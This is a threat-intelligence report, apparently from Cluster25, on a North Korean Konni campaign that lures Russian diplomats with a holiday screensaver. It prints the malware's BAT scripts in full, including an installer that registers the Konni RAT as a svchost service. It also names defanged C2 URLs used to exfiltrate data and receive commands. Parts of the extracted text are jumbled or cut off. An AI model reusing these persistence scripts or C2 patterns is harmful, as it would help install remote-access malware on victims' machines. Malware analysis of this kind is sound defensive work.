TLP:WHITE01 // 03 // 2022 NORTH KOREAN GROUP “KONNI” TARGETS THE RUSSIAN DIPLOMATIC SECTOR WITH NEW VERSIONS OF MALWARE IMPLANTSwww.cluster25.io @cluster25_ioTABLE OF CONTENTSKILLCHAIN OVERVIEW KONNI RAT ANALYSIS ATTRIBUTION ATT&CK MATRIX INDICATORS OF COMPROMISE 192022 // © Cluster25EXECUTIVE SUMMARYCluster25 analyzed a recent attack linked to the North Korean APT group “Konni” targetingRussian diplomatic sector using a spear phishing theme for New Year's Eve festivities as lure. Oncethe malicious email attachment is opened and executed, a chain composed by multiple stages istriggered, allowing actor to install an implant belonging to the Konni RAT family as finalpayload.2022 // © Cluster25TLP:WHITEUnrestricted // freely shareable content01 KILLCHAIN OVERVIEW scrnsave.scr Windows application. When executed, it drops under the %TEMP% directory animage named Happy.jpg (which is embedded in the resource section) and opens it as aforeground window to trick the victim into believing that it is a legitimate Russian themed happyholidays screensaver.Subsequently, in the background, the malware starts its malicious activities by downloading the next stage payload from an HTTP GET request to the Command-and-Control domaini758769.atwebpages.com, passing as parameters the hardcoded user id numbered as 18756and a type used as a flag to specify if the infected machine was 32 or 64 bit. The Command-and-Control Apache webserver response was configured to respond with HTTP status code 401,having the attacker set a fake .htaccess (likely to ensure it went unnoticed at security checks),returning as a response, in any case, a compressed CAB file encoded in base64 visible in theevidence below.2022 // © Cluster256TLP:WHITEUnrestricted // freely shareable contentAfter the CAB downloading, the malware starts the file decompression using expand.exe processlogging a file named - a.log - when the decompression is finished. The following image illustratesthe snipped of code described.2022 // © Cluster257TLP:WHITEUnrestricted // freely shareable contentTo optimize the time wasted during CAB decompression, the malware writes and executes the following BAT file into the %TEMP% directory, which was contained in the data section encodedin base64:CODE@ECHO OFFCD /D %TEMP%: WAITINGTIMEOUT /T 1IF NOT EXIST "A.LOG" (GOTO WAITING)DEL /F /Q "A.LOG"INSTALL.BAT DEL /F /Q "%~DPNX0”The script’s scope is to wait for the decompression to finish by using the creation of a.log file asflag and automatically execute the content of the CAB extraction, which is the install.bat file (oneof the files contained into the CAB), and finally delete itself using "%~DPNX0”, a bat scriptconvention used to specify the BAT fileitself. As previously described the CAB file’sdecompressed content contains the following files: Install.bat scrnsvc.ini scrnsvc.dllInstall.bat file is the launcher of the next stage infection, which hides the tracks of the previous activities by moving all the files into the System32 directory and installing and starting the final2022 // © Cluster258TLP:WHITEUnrestricted // freely shareable contentimplant scrnsvc.dll as a Windows service named ScreenSaver Management Service, which, when registered, loads the configuration file scrnvsvc.ini. The Windows service is installed byconfiguring svchost.exe as a process container of the DLL executable representing Konni RATmalware. Install.bat has already been seen among the TTPs belonging to this threat actor, whichcontent is visible below, where, in this case, it appears to have been slightly modified, and thereforemore likely to deceive detection signatures referring to files used in previous intrusions.CODE@echo offset DSP_NAME="ScreenSaver Management Service"sc stop scrnsvc > nulecho %~dp0 | findstr /i "system32" > nulif %ERRORLEVEL% equ 0 (goto INSTALL) else (goto COPYFILE): COPYFILEcopy /y "%~dp0\scrnsvc.dll" "%windir%\System32" > nuldel /f /q "%~dp0\scrnsvc.dll" > nulcopy /y "%~dp0\scrnsvc.ini" "%windir%\System32" > nuldel /f /q "%~dp0\scrnsvc.ini" > nuldel /f /q "%windir%\System32\scrnsvc.dat" > nul: INSTALLsc create scrnsvc binpath= "%windir%\System32\svchost.exe -k scrnsvc" DisplayName= %DSP_NAME% > nulsc description scrnsvc %DSP_NAME% > nulsc config scrnsvc type= interact type= own start= auto error= normal binpath= "%windir%\System32\svchost.exe -k scrnsvc" > nulreg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost" /v scrnsvc /t REG_MULTI_SZ /d "scrnsvc" /f > nul2022 // © Cluster259TLP:WHITEUnrestricted // freely shareable contentCODEreg add "HKLM\SYSTEM\CurrentControlSet\Services\scrnsvc\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%windir%\System32\scrnsvc.dll" /f > nulsc start scrnsvc > nuldel /f /q "%~dp0\wpnprv.dll" > nuldel /f /q "%~dp0\*.bat" > nul be converted into a CAB file using cmd /c makecab and furtherly encrypted and sent to theattackerserverviaHTTPPOSTrequestbodytohxxp://455686[.]c1[.]biz/up[.]php?name=%COMPUTER-NAME%, passingthe operatingsystem computer name as parameter as evidences in the network dump reported following:If the server response does not contain the string “success!” the malware tries to resend therequest, or it starts to send HTTP GET loop requests to receive commands from the server locatedat hxxp://455686[.]c1[.]biz /dn.php?name=%COMPUTERNAME%&prefix=tt. The commandsreceived are parsed from the response and, if containing the character ”>” are executed viaCreateProcessAsUserW obtaining the Token belonging to svchost.exe process (likely to avoidexceptions during output redirection of the file writing, being the sample located in System32folder), otherwise using the CreateProcessW function.2022 // © Cluster2512TLP:WHITEUnrestricted // freely shareable contentAt the time of the analysis the server was up but it did not provide the commands to be executed,probably because the actor set up the Command and Control backend with some form ofgeofencing validation.05 ATTRIBUTIONCluster25 attributes these intrusion attempts with high degree of confidence to the North Koreangroup known as Konni. Konni is also the name of their custom RAT which presents intelligencegathering features. In this case the final implant is a new version of Konni RAT having code andbehavioral similarities with its previous versions. The reported kill-chain shows overlaps with theTTPs already linked to this group as the use of CAB files as infection stage and the use of bat fileto automatically install Konni RAT as a service. Identifiable modifications are evident in the patternused for the initial access phase, most likely put in place to exploit the holiday time of year as bait.2022 // © Cluster2513TLP:WHITEUnrestricted // freely shareable contentFinally, it is possible to notice the use of "ZETTA HOSTING SOLUTIONS LLC" (AS44476) as Cluster25 is the internal Cyber Intelligence Research and Adversary Hunting Unit at DuskRise Inc. Cluster25 experts are specialized in hunting and collecting cyber threats, analysis, reverse-engineering and adversary hunting practices. Cluster25 independently designs and develops technologies aimed at the classification and categorization of malicious artifacts as well as for their correlation with known threat groups. Relying on extensive visibility into the digital threat landscape, it overcomes the usual limitations of services based on ex-post threat observation by providing real predictive and proactive intelligence services. Visit us at cluster25.io ©2021 Cluster25. All rights reserved. The reproduction and distribution of this material is prohibited without express writtenpermission from Cluster25. Traffic Light Protocol (TLP) violation could lead to the immediate cancellation of existing services as well as the initiation of legal actions aimed at protecting the intellectual property and competitive advantage of DuskRise Inc. Given theinherent nature of threat intelligence, the content contained in this report is based on information gathered and understood at the time of its creation. The information in this report is general in nature and does not take into account the specific needs of your IT ecosystemand network, which may vary and require unique action. As such, Cluster25 provides the information and content on an “as-is” basis without representation or warranty and accepts no liability for any action or failure to act taken in response to the informationcontained or referenced in this report. The reader is responsible for determining whether or not to follow any of the suggestions, recommendations or potential mitigations set out in this report, entirely at their own discretion. 